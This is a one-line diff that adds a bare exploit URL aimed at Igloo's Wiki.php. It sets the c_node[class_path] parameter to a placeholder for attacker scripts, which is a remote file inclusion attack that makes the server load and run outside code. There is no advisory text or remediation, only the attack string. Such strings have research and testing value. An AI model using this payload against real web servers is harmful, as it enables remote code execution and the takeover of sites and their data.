@@ -1,0 +1,1 @@
+http://www.example.com/[Igloo_path]/class/Wiki/Wiki.php?c_node[class_path]=[evil_scripts]
